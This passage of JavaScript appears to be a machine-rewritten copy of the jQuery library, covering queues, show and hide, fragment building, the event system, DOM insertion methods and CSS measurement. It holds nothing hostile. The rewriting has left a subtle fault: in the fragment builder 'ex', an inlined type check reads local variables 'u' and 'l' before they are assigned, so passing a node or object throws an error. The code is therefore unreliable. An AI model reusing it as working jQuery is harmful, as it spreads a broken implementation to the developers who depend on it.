        b._queueHooks(this, e);
        if ("fx" === e && "inprogress" !== n[0]) {
          b.dequeue(this, e);
        }
      });
    },
    dequeue: function (e) {
      return this.each(function () {
        b.dequeue(this, e);
      });
    },
    clearQueue: function (e) {
      return this.queue(e || "fx", []);
    },
    promise: function (e, t) {
      var n;
      var r = 1;
      var i = b.Deferred();
      var o = this;
      var a = this.length;
      var s = function () {
        if (! --r) {
          i.resolveWith(o, [o]);
        }
      };
      if ("string" != typeof e) {
        t = e;
        e = undefined;
      }
      for (e = e || "fx"; a--;) {
        if ((n = Y.get(o[a], e + "queueHooks")) && n.empty) {
          r++;
          n.empty.add(s);
        }
      }
      s();
      return i.promise(t);
    }
  });
  var ee = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source;
  var et = RegExp("^(?:([+-])=|)(" + ee + ")([a-z%]*)$", "i");
  var en = ["Top", "Right", "Bottom", "Left"];
  var er = v.documentElement;
  var ei = function (e) {
    return b.contains(e.ownerDocument, e);
  };
  var eo = {
    composed: true
  };
  if (er.getRootNode) {
    ei = function (e) {
      return b.contains(e.ownerDocument, e) || e.getRootNode(eo) === e.ownerDocument;
    };
  }
  var ea = function (e, t) {
    return "none" === (e = t || e).style.display || "" === e.style.display && ei(e) && "none" === b.css(e, "display");
  };
  function es(e, t, n, r) {
    var i;
    var o;
    var a = 20;
    var s = r ? function () {
      return r.cur();
    } : function () {
      return b.css(e, t, "");
    };
    var u = s();
    var l = n && n[3] || (b.cssNumber[t] ? "" : "px");
    var c = e.nodeType && (b.cssNumber[t] || "px" !== l && +u) && et.exec(b.css(e, t));
    if (c && c[3] !== l) {
      u /= 2;
      l = l || c[3];
      for (c = +u || 1; a--;) {
        b.style(e, t, c + l);
        if ((1 - o) * (1 - (o = s() / u || 0.5)) <= 0) {
          a = 0;
        }
        c /= o;
      }
      c *= 2;
      b.style(e, t, c + l);
      n = n || [];
    }
    if (n) {
      c = +c || +u || 0;
      i = n[1] ? c + (n[1] + 1) * n[2] : +n[2];
      if (r) {
        r.unit = l;
        r.start = c;
        r.end = i;
      }
    }
    return i;
  }
  var eu = {};
  function el(e) {
    var t;
    var n = e.ownerDocument;
    var r = e.nodeName;
    var i = eu[r];
    return i || (t = n.body.appendChild(n.createElement(r)), i = b.css(t, "display"), t.parentNode.removeChild(t), "none" === i && (i = "block"), eu[r] = i, i);
  }
  function ec(e, t) {
    var n;
    var r;
    var i = [];
    var o = 0;
    for (var a = e.length; o < a; o++) {
      if ((r = e[o]).style) {
        n = r.style.display;
        if (t) {
          if ("none" === n) {
            i[o] = Y.get(r, "display") || null;
            if (!i[o]) {
              r.style.display = "";
            }
          }
          if ("" === r.style.display && ea(r)) {
            i[o] = el(r);
          }
        } else if ("none" !== n) {
          i[o] = "none";
          Y.set(r, "display", n);
        }
      }
    }
    for (o = 0; o < a; o++) {
      if (null != i[o]) {
        e[o].style.display = i[o];
      }
    }
    return e;
  }
  b.fn.extend({
    show: function () {
      return ec(this, true);
    },
    hide: function () {
      return ec(this);
    },
    toggle: function (e) {
      return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () {
        if (ea(this)) {
          new b.fn.init(this, undefined).show();
        } else {
          new b.fn.init(this, undefined).hide();
        }
      });
    }
  });
  var ef;
  var ep;
  var ed = /^(?:checkbox|radio)$/i;
  var eh = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i;
  var eg = /^$|^module$|\/(?:java|ecma)script/i;
  ef = v.createDocumentFragment().appendChild(v.createElement("div"));
  (ep = v.createElement("input")).setAttribute("type", "radio");
  ep.setAttribute("checked", "checked");
  ep.setAttribute("name", "t");
  ef.appendChild(ep);
  d.checkClone = ef.cloneNode(true).cloneNode(true).lastChild.checked;
  ef.innerHTML = "<textarea>x</textarea>";
  d.noCloneChecked = !!ef.cloneNode(true).lastChild.defaultValue;
  ef.innerHTML = "<option></option>";
  d.option = !!ef.lastChild;
  var ev = {
    thead: [1, "<table>", "</table>"],
    col: [2, "<table><colgroup>", "</colgroup></table>"],
    tr: [2, "<table><tbody>", "</tbody></table>"],
    td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
    _default: [0, "", ""]
  };
  function em(e, t) {
    var n;
    n = undefined !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : undefined !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [];
    return undefined === t || t && e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase() ? b.merge([e], n) : n;
  }
  function ey(e, t) {
    var n = 0;
    for (var r = e.length; n < r; n++) {
      Y.set(e[n], "globalEval", !t || Y.get(t[n], "globalEval"));
    }
  }
  ev.tbody = ev.tfoot = ev.colgroup = ev.caption = ev.thead;
  ev.th = ev.td;
  if (!d.option) {
    ev.optgroup = ev.option = [1, "<select multiple='multiple'>", "</select>"];
  }
  var e$ = /<|&#?\w+;/;
  function ex(e, t, n, r, i) {
    var o;
    var a;
    var s;
    var u;
    var l;
    var c;
    var f = t.createDocumentFragment();
    var p = [];
    var d = 0;
    for (var h = e.length; d < h; d++) {
      if ((o = e[d]) || 0 === o) {
        if ("object" === (null == o ? o + "" : "object" == typeof o || "function" == typeof o ? u[l.call(o)] || "object" : typeof o)) {
          b.merge(p, o.nodeType ? [o] : o);
        } else if (e$.test(o)) {
          a = a || f.appendChild(t.createElement("div"));
          u = ev[s = (eh.exec(o) || ["", ""])[1].toLowerCase()] || ev._default;
          a.innerHTML = u[1] + b.htmlPrefilter(o) + u[2];
          for (c = u[0]; c--;) {
            a = a.lastChild;
          }
          b.merge(p, a.childNodes);
          (a = f.firstChild).textContent = "";
        } else {
          p.push(t.createTextNode(o));
        }
      }
    }
    f.textContent = "";
    for (d = 0; o = p[d++];) {
      if (r && b.inArray(o, r) > -1) {
        if (i) {
          i.push(o);
        }
      } else {
        l = ei(o);
        a = em(f.appendChild(o), "script");
        if (l) {
          ey(a);
        }
        if (n) {
          for (c = 0; o = a[c++];) {
            if (eg.test(o.type || "")) {
              n.push(o);
            }
          }
        }
      }
    }
    return f;
  }
  var eb = /^([^.]*)(?:\.(.+)|)/;
  function e_() {
    return true;
  }
  function eT() {
    return false;
  }
  function ew(e, t) {
    return e === function () {
      try {
        return v.activeElement;
      } catch (e) {}
    }() == ("focus" === t);
  }
  function eC(e, t, n, r, i, o) {
    var a;
    var s;
    if ("object" == typeof t) {
      if ("string" != typeof n) {
        r = r || n;
        n = undefined;
      }
      for (s in t) eC(e, s, n, r, t[s], o);
      return e;
    }
    if (null == r && null == i) {
      i = n;
      r = n = undefined;
    } else if (null == i) {
      if ("string" == typeof n) {
        i = r;
        r = undefined;
      } else {
        i = r;
        r = n;
        n = undefined;
      }
    }
    if (false === i) {
      i = eT;
    } else if (!i) {
      return e;
    }
    if (1 === o) {
      a = i;
      (i = function (e) {
        new b.fn.init(undefined, undefined).off(e);
        return a.apply(this, arguments);
      }).guid = a.guid || (a.guid = b.guid++);
    }
    return e.each(function () {
      b.event.add(this, t, i, r, n);
    });
  }
  function ek(e, t, n) {
    if (n) {
      Y.set(e, t, false);
      b.event.add(e, t, {
        namespace: false,
        handler: function (e) {
          var r;
          var o;
          var a = Y.get(this, t);
          if (1 & e.isTrigger && this[t]) {
            if (a.length) {
              if ((b.event.special[t] || {}).delegateType) {
                e.stopPropagation();
              }
            } else {
              a = i.call(arguments);
              Y.set(this, t, a);
              r = n(this, t);
              this[t]();
              if (a !== (o = Y.get(this, t)) || r) {
                Y.set(this, t, false);
              } else {
                o = {};
              }
              if (a !== o) {
                e.stopImmediatePropagation();
                e.preventDefault();
                return o && o.value;
              }
            }
          } else if (a.length) {
            Y.set(this, t, {
              value: b.event.trigger(b.extend(a[0], b.Event.prototype), a.slice(1), this)
            });
            e.stopImmediatePropagation();
          }
        }
      });
    } else if (undefined === Y.get(e, t)) {
      b.event.add(e, t, e_);
    }
  }
  b.event = {
    global: {},
    add: function (e, t, n, r, i) {
      var o;
      var a;
      var s;
      var u;
      var l;
      var c;
      var f;
      var p;
      var d;
      var h;
      var g;
      var v = Y.get(e);
      if (1 === e.nodeType || 9 === e.nodeType || !+e.nodeType) {
        if (n.handler) {
          n = (o = n).handler;
          i = o.selector;
        }
        if (i) {
          b.find.matchesSelector(er, i);
        }
        if (!n.guid) {
          n.guid = b.guid++;
        }
        if (!(u = v.events)) {
          u = v.events = Object.create(null);
        }
        if (!(a = v.handle)) {
          a = v.handle = function (t) {
            return undefined !== b && b.event.triggered !== t.type ? b.event.dispatch.apply(e, arguments) : undefined;
          };
        }
        for (l = (t = (t || "").match(H) || [""]).length; l--;) {
          d = g = (s = eb.exec(t[l]) || [])[1];
          h = (s[2] || "").split(".").sort();
          if (d) {
            f = b.event.special[d] || {};
            d = (i ? f.delegateType : f.bindType) || d;
            f = b.event.special[d] || {};
            c = b.extend({
              type: d,
              origType: g,
              data: r,
              handler: n,
              guid: n.guid,
              selector: i,
              needsContext: i && b.expr.match.needsContext.test(i),
              namespace: h.join(".")
            }, o);
            if (!(p = u[d])) {
              (p = u[d] = []).delegateCount = 0;
              if (!(f.setup && false !== f.setup.call(e, r, h, a))) {
                if (e.addEventListener) {
                  e.addEventListener(d, a);
                }
              }
            }
            if (f.add) {
              f.add.call(e, c);
              if (!c.handler.guid) {
                c.handler.guid = n.guid;
              }
            }
            if (i) {
              p.splice(p.delegateCount++, 0, c);
            } else {
              p.push(c);
            }
            b.event.global[d] = true;
          }
        }
      }
    },
    remove: function (e, t, n, r, i) {
      var o;
      var a;
      var s;
      var u;
      var l;
      var c;
      var f;
      var p;
      var d;
      var h;
      var g;
      var v = Y.hasData(e) && Y.get(e);
      if (v && (u = v.events)) {
        for (l = (t = (t || "").match(H) || [""]).length; l--;) {
          d = g = (s = eb.exec(t[l]) || [])[1];
          h = (s[2] || "").split(".").sort();
          if (d) {
            f = b.event.special[d] || {};
            p = u[d = (r ? f.delegateType : f.bindType) || d] || [];
            s = s[2] && RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)");
            for (a = o = p.length; o--;) {
              c = p[o];
              if (!(!i && g !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector))) {
                p.splice(o, 1);
                if (c.selector) {
                  p.delegateCount--;
                }
                if (f.remove) {
                  f.remove.call(e, c);
                }
              }
            }
            if (a && !p.length) {
              if (!(f.teardown && false !== f.teardown.call(e, h, v.handle))) {
                b.removeEvent(e, d, v.handle);
              }
              delete u[d];
            }
          } else {
            for (d in u) b.event.remove(e, d + t[l], n, r, true);
          }
        }
        if (b.isEmptyObject(u)) {
          Y.remove(e, "handle events");
        }
      }
    },
    dispatch: function (e) {
      var t;
      var n;
      var r;
      var i;
      var o;
      var a;
      var s = Array(arguments.length);
      var u = b.event.fix(e);
      var l = (Y.get(this, "events") || Object.create(null))[u.type] || [];
      var c = b.event.special[u.type] || {};
      s[0] = u;
      for (t = 1; t < arguments.length; t++) {
        s[t] = arguments[t];
      }
      u.delegateTarget = this;
      if (!c.preDispatch || false !== c.preDispatch.call(this, u)) {
        a = b.event.handlers.call(this, u, l);
        for (t = 0; (i = a[t++]) && !u.isPropagationStopped();) {
          u.currentTarget = i.elem;
          for (n = 0; (o = i.handlers[n++]) && !u.isImmediatePropagationStopped();) {
            if (!(u.rnamespace && false !== o.namespace && !u.rnamespace.test(o.namespace))) {
              u.handleObj = o;
              u.data = o.data;
              if (undefined !== (r = ((b.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, s)) && false === (u.result = r)) {
                u.preventDefault();
                u.stopPropagation();
              }
            }
          }
        }
        if (c.postDispatch) {
          c.postDispatch.call(this, u);
        }
        return u.result;
      }
    },
    handlers: function (e, t) {
      var n;
      var r;
      var i;
      var o;
      var a;
      var s = [];
      var u = t.delegateCount;
      var l = e.target;
      if (u && l.nodeType && !("click" === e.type && e.button >= 1)) {
        for (; l !== this; l = l.parentNode || this) {
          if (1 === l.nodeType && ("click" !== e.type || true !== l.disabled)) {
            o = [];
            a = {};
            for (n = 0; n < u; n++) {
              if (undefined === a[i = (r = t[n]).selector + " "]) {
                a[i] = r.needsContext ? new b.fn.init(i, this).index(l) > -1 : b.find(i, this, null, [l]).length;
              }
              if (a[i]) {
                o.push(r);
              }
            }
            if (o.length) {
              s.push({
                elem: l,
                handlers: o
              });
            }
          }
        }
      }
      l = this;
      if (u < t.length) {
        s.push({
          elem: l,
          handlers: t.slice(u)
        });
      }
      return s;
    },
    addProp: function (e, t) {
      Object.defineProperty(b.Event.prototype, e, {
        enumerable: true,
        configurable: true,
        get: "function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item ? function () {
          if (this.originalEvent) {
            return t(this.originalEvent);
          }
        } : function () {
          if (this.originalEvent) {
            return this.originalEvent[e];
          }
        },
        set: function (t) {
          Object.defineProperty(this, e, {
            enumerable: true,
            configurable: true,
            writable: true,
            value: t
          });
        }
      });
    },
    fix: function (e) {
      return e[b.expando] ? e : new b.Event(e);
    },
    special: {
      load: {
        noBubble: true
      },
      click: {
        setup: function (e) {
          var t = this || e;
          if (ed.test(t.type) && t.click && t.nodeName && t.nodeName.toLowerCase() === "input".toLowerCase()) {
            ek(t, "click", e_);
          }
          return false;
        },
        trigger: function (e) {
          var t = this || e;
          if (ed.test(t.type) && t.click && t.nodeName && t.nodeName.toLowerCase() === "input".toLowerCase()) {
            ek(t, "click");
          }
          return true;
        },
        _default: function (e) {
          var t = e.target;
          return ed.test(t.type) && t.click && t.nodeName && t.nodeName.toLowerCase() === "input".toLowerCase() && Y.get(t, "click") || t.nodeName && t.nodeName.toLowerCase() === "a".toLowerCase();
        }
      },
      beforeunload: {
        postDispatch: function (e) {
          if (undefined !== e.result && e.originalEvent) {
            e.originalEvent.returnValue = e.result;
          }
        }
      }
    }
  };
  b.removeEvent = function (e, t, n) {
    if (e.removeEventListener) {
      e.removeEventListener(t, n);
    }
  };
  b.Event = function (e, t) {
    if (!(this instanceof b.Event)) {
      return new b.Event(e, t);
    }
    if (e && e.type) {
      this.originalEvent = e;
      this.type = e.type;
      this.isDefaultPrevented = e.defaultPrevented || undefined === e.defaultPrevented && false === e.returnValue ? e_ : eT;
      this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target;
      this.currentTarget = e.currentTarget;
      this.relatedTarget = e.relatedTarget;
    } else {
      this.type = e;
    }
    if (t) {
      b.extend(this, t);
    }
    this.timeStamp = e && e.timeStamp || Date.now();
    this[b.expando] = true;
  };
  b.Event.prototype = {
    constructor: b.Event,
    isDefaultPrevented: eT,
    isPropagationStopped: eT,
    isImmediatePropagationStopped: eT,
    isSimulated: false,
    preventDefault: function () {
      var e = this.originalEvent;
      this.isDefaultPrevented = e_;
      if (e && !this.isSimulated) {
        e.preventDefault();
      }
    },
    stopPropagation: function () {
      var e = this.originalEvent;
      this.isPropagationStopped = e_;
      if (e && !this.isSimulated) {
        e.stopPropagation();
      }
    },
    stopImmediatePropagation: function () {
      var e = this.originalEvent;
      this.isImmediatePropagationStopped = e_;
      if (e && !this.isSimulated) {
        e.stopImmediatePropagation();
      }
      this.stopPropagation();
    }
  };
  b.each({
    altKey: true,
    bubbles: true,
    cancelable: true,
    changedTouches: true,
    ctrlKey: true,
    detail: true,
    eventPhase: true,
    metaKey: true,
    pageX: true,
    pageY: true,
    shiftKey: true,
    view: true,
    char: true,
    code: true,
    charCode: true,
    key: true,
    keyCode: true,
    button: true,
    buttons: true,
    clientX: true,
    clientY: true,
    offsetX: true,
    offsetY: true,
    pointerId: true,
    pointerType: true,
    screenX: true,
    screenY: true,
    targetTouches: true,
    toElement: true,
    touches: true,
    which: true
  }, b.event.addProp);
  b.each({
    focus: "focusin",
    blur: "focusout"
  }, function (e, t) {
    b.event.special[e] = {
      setup: function () {
        ek(this, e, ew);
        return false;
      },
      trigger: function () {
        ek(this, e);
        return true;
      },
      _default: function () {
        return true;
      },
      delegateType: t
    };
  });
  b.each({
    mouseenter: "mouseover",
    mouseleave: "mouseout",
    pointerenter: "pointerover",
    pointerleave: "pointerout"
  }, function (e, t) {
    b.event.special[e] = {
      delegateType: t,
      bindType: t,
      handle: function (e) {
        var n;
        var r = e.relatedTarget;
        var i = e.handleObj;
        if (!(r && (r === this || b.contains(this, r)))) {
          e.type = i.origType;
          n = i.handler.apply(this, arguments);
          e.type = t;
        }
        return n;
      }
    };
  });
  b.fn.extend({
    on: function (e, t, n, r) {
      return eC(this, e, t, n, r);
    },
    one: function (e, t, n, r) {
      return eC(this, e, t, n, r, 1);
    },
    off: function (e, t, n) {
      var r;
      var i;
      if (e && e.preventDefault && e.handleObj) {
        r = e.handleObj;
        new b.fn.init(e.delegateTarget, undefined).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler);
        return this;
      }
      if ("object" == typeof e) {
        for (i in e) this.off(i, t, e[i]);
        return this;
      }
      if (!(false !== t && "function" != typeof t)) {
        n = t;
        t = undefined;
      }
      if (false === n) {
        n = eT;
      }
      return this.each(function () {
        b.event.remove(this, e, n, t);
      });
    }
  });
  var eS = /<script|<style|<link/i;
  var eE = /checked\s*(?:[^=]|=\s*.checked.)/i;
  var eN = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  function eD(e) {
    e.type = (null !== e.getAttribute("type")) + "/" + e.type;
    return e;
  }
  function ej(e) {
    if ("true/" === (e.type || "").slice(0, 5)) {
      e.type = e.type.slice(5);
    } else {
      e.removeAttribute("type");
    }
    return e;
  }
  function eq(e, t) {
    var n;
    var r;
    var i;
    var o;
    var a;
    var s;
    if (1 === t.nodeType) {
      if (Y.hasData(e) && (s = Y.get(e).events)) {
        Y.remove(t, "handle events");
        for (i in s) {
          n = 0;
          for (r = s[i].length; n < r; n++) {
            b.event.add(t, i, s[i][n]);
          }
        }
      }
      if (Q.hasData(e)) {
        o = Q.access(e);
        a = b.extend({}, o);
        Q.set(t, a);
      }
    }
  }
  function eL(e, t, n, r) {
    t = o(t);
    var i;
    var a;
    var s;
    var u;
    var l;
    var c;
    var f = 0;
    var p = e.length;
    var g = p - 1;
    var v = t[0];
    var m = "function" == typeof v && "number" != typeof v.nodeType && "function" != typeof v.item;
    if (m || p > 1 && "string" == typeof v && !d.checkClone && eE.test(v)) {
      return e.each(function (i) {
        var o = e.eq(i);
        if (m) {
          t[0] = v.call(this, i, o.html());
        }
        eL(o, t, n, r);
      });
    }
    if (p && (a = (i = ex(t, e[0].ownerDocument, false, e, r)).firstChild, 1 === i.childNodes.length && (i = a), a || r)) {
      for (u = (s = b.map(em(i, "script"), eD)).length; f < p; f++) {
        l = i;
        if (f !== g) {
          l = b.clone(l, true, true);
          if (u) {
            b.merge(s, em(l, "script"));
          }
        }
        n.call(e[f], l, f);
      }
      if (u) {
        c = s[s.length - 1].ownerDocument;
        b.map(s, ej);
        for (f = 0; f < u; f++) {
          l = s[f];
          if (eg.test(l.type || "") && !Y.access(l, "globalEval") && b.contains(c, l)) {
            if (l.src && "module" !== (l.type || "").toLowerCase()) {
              if (b._evalUrl && !l.noModule) {
                b._evalUrl(l.src, {
                  nonce: l.nonce || l.getAttribute("nonce")
                }, c);
              }
            } else {
              y(l.textContent.replace(eN, ""), l, c);
            }
          }
        }
      }
    }
    return e;
  }
  function eH(e, t, n) {
    var r;
    var i = t ? b.filter(t, e) : e;
    for (var o = 0; null != (r = i[o]); o++) {
      if (!(n || 1 !== r.nodeType)) {
        b.cleanData(em(r));
      }
      if (r.parentNode) {
        if (n && ei(r)) {
          ey(em(r, "script"));
        }
        r.parentNode.removeChild(r);
      }
    }
    return e;
  }
  b.extend({
    htmlPrefilter: function (e) {
      return e;
    },
    clone: function (e, t, n) {
      var r;
      var i;
      var o;
      var a;
      var s;
      var u;
      var l;
      var c = e.cloneNode(true);
      var f = ei(e);
      if (!(d.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || b.isXMLDoc(e))) {
        a = em(c);
        r = 0;
        for (i = (o = em(e)).length; r < i; r++) {
          s = o[r];
          u = a[r];
          l = undefined;
          if ("input" === (l = u.nodeName.toLowerCase()) && ed.test(s.type)) {
            u.checked = s.checked;
          } else if (!("input" !== l && "textarea" !== l)) {
            u.defaultValue = s.defaultValue;
          }
        }
      }
      if (t) {
        if (n) {
          o = o || em(e);
          a = a || em(c);
          r = 0;
          for (i = o.length; r < i; r++) {
            eq(o[r], a[r]);
          }
        } else {
          eq(e, c);
        }
      }
      if ((a = em(c, "script")).length > 0) {
        ey(a, !f && em(e, "script"));
      }
      return c;
    },
    cleanData: function (e) {
      var t;
      var n;
      var r;
      var i = b.event.special;
      for (var o = 0; undefined !== (n = e[o]); o++) {
        if (1 === n.nodeType || 9 === n.nodeType || !+n.nodeType) {
          if (t = n[Y.expando]) {
            if (t.events) {
              for (r in t.events) if (i[r]) {
                b.event.remove(n, r);
              } else {
                b.removeEvent(n, r, t.handle);
              }
            }
            n[Y.expando] = undefined;
          }
          if (n[Q.expando]) {
            n[Q.expando] = undefined;
          }
        }
      }
    }
  });
  b.fn.extend({
    detach: function (e) {
      return eH(this, e, true);
    },
    remove: function (e) {
      return eH(this, e);
    },
    text: function (e) {
      return R(this, function (e) {
        return undefined === e ? b.text(this) : this.empty().each(function () {
          if (!(1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType)) {
            this.textContent = e;
          }
        });
      }, null, e, arguments.length);
    },
    append: function () {
      return eL(this, arguments, function (e) {
        if (!(1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType)) {
          (this.nodeName && this.nodeName.toLowerCase() === "table".toLowerCase() && (11 !== e.nodeType ? e : e.firstChild).nodeName && (11 !== e.nodeType ? e : e.firstChild).nodeName.toLowerCase() === "tr".toLowerCase() && new b.fn.init(this, undefined).children("tbody")[0] || this).appendChild(e);
        }
      });
    },
    prepend: function () {
      return eL(this, arguments, function (e) {
        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
          var t = this.nodeName && this.nodeName.toLowerCase() === "table".toLowerCase() && (11 !== e.nodeType ? e : e.firstChild).nodeName && (11 !== e.nodeType ? e : e.firstChild).nodeName.toLowerCase() === "tr".toLowerCase() && new b.fn.init(this, undefined).children("tbody")[0] || this;
          t.insertBefore(e, t.firstChild);
        }
      });
    },
    before: function () {
      return eL(this, arguments, function (e) {
        if (this.parentNode) {
          this.parentNode.insertBefore(e, this);
        }
      });
    },
    after: function () {
      return eL(this, arguments, function (e) {
        if (this.parentNode) {
          this.parentNode.insertBefore(e, this.nextSibling);
        }
      });
    },
    empty: function () {
      var e;
      for (var t = 0; null != (e = this[t]); t++) {
        if (1 === e.nodeType) {
          b.cleanData(em(e, false));
          e.textContent = "";
        }
      }
      return this;
    },
    clone: function (e, t) {
      e = null != e && e;
      t = null == t ? e : t;
      return this.map(function () {
        return b.clone(this, e, t);
      });
    },
    html: function (e) {
      return R(this, function (e) {
        var t = this[0] || {};
        var n = 0;
        var r = this.length;
        if (undefined === e && 1 === t.nodeType) {
          return t.innerHTML;
        }
        if ("string" == typeof e && !eS.test(e) && !ev[(eh.exec(e) || ["", ""])[1].toLowerCase()]) {
          e = b.htmlPrefilter(e);
          try {
            for (; n < r; n++) {
              if (1 === (t = this[n] || {}).nodeType) {
                b.cleanData(em(t, false));
                t.innerHTML = e;
              }
            }
            t = 0;
          } catch (i) {}
        }
        if (t) {
          this.empty().append(e);
        }
      }, null, e, arguments.length);
    },
    replaceWith: function () {
      var e = [];
      return eL(this, arguments, function (t) {
        var n = this.parentNode;
        if (0 > b.inArray(this, e)) {
          b.cleanData(em(this));
          if (n) {
            n.replaceChild(t, this);
          }
        }
      }, e);
    }
  });
  b.each({
    appendTo: "append",
    prependTo: "prepend",
    insertBefore: "before",
    insertAfter: "after",
    replaceAll: "replaceWith"
  }, function (e, t) {
    b.fn[e] = function (e) {
      var n;
      var r = [];
      var i = new b.fn.init(e, undefined);
      var o = i.length - 1;
      for (var s = 0; s <= o; s++) {
        n = s === o ? this : this.clone(true);
        new b.fn.init(i[s], undefined)[t](n);
        a.apply(r, n.get());
      }
      return this.pushStack(r);
    };
  });
  var eP = RegExp("^(" + ee + ")(?!px)[a-z%]+$", "i");
  var eO = function (t) {
    var n = t.ownerDocument.defaultView;
    if (!(n && n.opener)) {
      n = e;
    }
    return n.getComputedStyle(t);
  };
  var e0 = function (e, t, n) {
    var r;
    var i;
    var o = {};
    for (i in t) {
      o[i] = e.style[i];
      e.style[i] = t[i];
    }
    r = n.call(e);
    for (i in t) e.style[i] = o[i];
    return r;
  };
  var eI = RegExp(en.join("|"), "i");
  function eM(e, t, n) {
    var r;
    var i;
    var o;
    var a;
    var s = e.style;
    if (n = n || eO(e)) {
      if (!("" !== (a = n.getPropertyValue(t) || n[t]) || ei(e))) {
        a = b.style(e, t);
      }
      if (!d.pixelBoxStyles() && eP.test(a) && eI.test(t)) {
        r = s.width;
        i = s.minWidth;
        o = s.maxWidth;
        s.minWidth = s.maxWidth = s.width = a;
        a = n.width;
        s.width = r;
        s.minWidth = i;
        s.maxWidth = o;
      }
    }
    return undefined !== a ? a + "" : a;
  }
  function eW(e, t) {
    return {
      get: function () {
        if (!e()) {
          return (this.get = t).apply(this, arguments);
        }
        delete this.get;
      }
    };
  }
  !function () {
    function t() {
      if (c) {
        l.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0";
        c.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%";
        er.appendChild(l).appendChild(c);
        var t = e.getComputedStyle(c);
        r = "1%" !== t.top;
        u = 12 === Math.round(parseFloat(t.marginLeft));
        c.style.right = "60%";
        a = 36 === Math.round(parseFloat(t.right));
        i = 36 === Math.round(parseFloat(t.width));
        c.style.position = "absolute";
        o = 12 === Math.round(parseFloat(c.offsetWidth / 3));
        er.removeChild(l);
        c = null;
      }
    }
    var r;
    var i;
    var o;
    var a;
    var s;
    var u;
    var l = v.createElement("div");
    var c = v.createElement("div");
    if (c.style) {
      c.style.backgroundClip = "content-box";
      c.cloneNode(true).style.backgroundClip = "";
      d.clearCloneStyle = "content-box" === c.style.backgroundClip;
      b.extend(d, {
        boxSizingReliable: function () {
          t();
          return i;
        },
        pixelBoxStyles: function () {
          t();
          return a;
        },
        pixelPosition: function () {
          t();
          return r;
        },
        reliableMarginLeft: function () {
          t();
          return u;
        },
        scrollboxSize: function () {
          t();
          return o;
        },
        reliableTrDimensions: function () {
          var t;
          var n;
          var r;
          var i;
          if (null == s) {
            t = v.createElement("table");
            n = v.createElement("tr");
            r = v.createElement("div");
            t.style.cssText = "position:absolute;left:-11111px;border-collapse:separate";
            n.style.cssText = "border:1px solid";
            n.style.height = "1px";
            r.style.height = "9px";
            r.style.display = "block";
            er.appendChild(t).appendChild(n).appendChild(r);
            s = parseInt((i = e.getComputedStyle(n)).height, 10) + parseInt(i.borderTopWidth, 10) + parseInt(i.borderBottomWidth, 10) === n.offsetHeight;
            er.removeChild(t);
          }
          return s;
        }
      });
    }
  }();
  var e1 = ["Webkit", "Moz", "ms"];
  var eB = v.createElement("div").style;
  var e9 = {};
  function eR(e) {
    return b.cssProps[e] || e9[e] || (e in eB ? e : e9[e] = function (e) {
      var t = e[0].toUpperCase() + e.slice(1);
      for (var n = e1.length; n--;) {
        if ((e = e1[n] + t) in eB) {
          return e;
        }
      }
    }(e) || e);
  }
  var eF = /^(none|table(?!-c[ea]).+)/;
  var e8 = /^--/;
  var ez = {
    position: "absolute",
    visibility: "hidden",
    display: "block"
  };
  var eX = {
    letterSpacing: "0",
    fontWeight: "400"
  };
  function e2(e, t, n) {
    var r = et.exec(t);
    return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t;
  }
  function e4(e, t, n, r, i, o) {
    var a = "width" === t ? 1 : 0;
    var s = 0;
    var u = 0;
    if (n === (r ? "border" : "content")) {
      return 0;
    }
    for (; a < 4; a += 2) {
      if ("margin" === n) {
        u += b.css(e, n + en[a], true, i);
      }
      if (r) {
        if ("content" === n) {
          u -= b.css(e, "padding" + en[a], true, i);
        }
        if ("margin" !== n) {
          u -= b.css(e, "border" + en[a] + "Width", true, i);
        }
      } else {
        u += b.css(e, "padding" + en[a], true, i);
        if ("padding" !== n) {
          u += b.css(e, "border" + en[a] + "Width", true, i);
        } else {
          s += b.css(e, "border" + en[a] + "Width", true, i);
        }
      }
    }
    if (!r && o >= 0) {
      u += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - o - u - s - 0.5)) || 0;
    }
    return u;
  }
  function eU(e, t, n) {
    var r = eO(e);
    var i = (!d.boxSizingReliable() || n) && "border-box" === b.css(e, "boxSizing", false, r);
    var o = i;
    var a = eM(e, t, r);
    var s = "offset" + t[0].toUpperCase() + t.slice(1);
    if (eP.test(a)) {
      if (!n) {
        return a;
      }
      a = "auto";
    }
    if ((!d.boxSizingReliable() && i || !d.reliableTrDimensions() && e.nodeName && e.nodeName.toLowerCase() === "tr".toLowerCase() || "auto" === a || !parseFloat(a) && "inline" === b.css(e, "display", false, r)) && e.getClientRects().length) {
      i = "border-box" === b.css(e, "boxSizing", false, r);
      if (o = s in e) {
        a = e[s];
      }
    }
    return (a = parseFloat(a) || 0) + e4(e, t, n || (i ? "border" : "content"), o, r, a) + "px";
  }
  function e3(e, t, n, r, i) {
    return new e3.prototype.init(e, t, n, r, i);
  }
  b.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = eM(e, "opacity");
            return "" === n ? "1" : n;
          }
        }
      }
    },
    cssNumber: {
      animationIterationCount: true,
      columnCount: true,
      fillOpacity: true,
      flexGrow: true,
      flexShrink: true,
      fontWeight: true,
      gridArea: true,
      gridColumn: true,
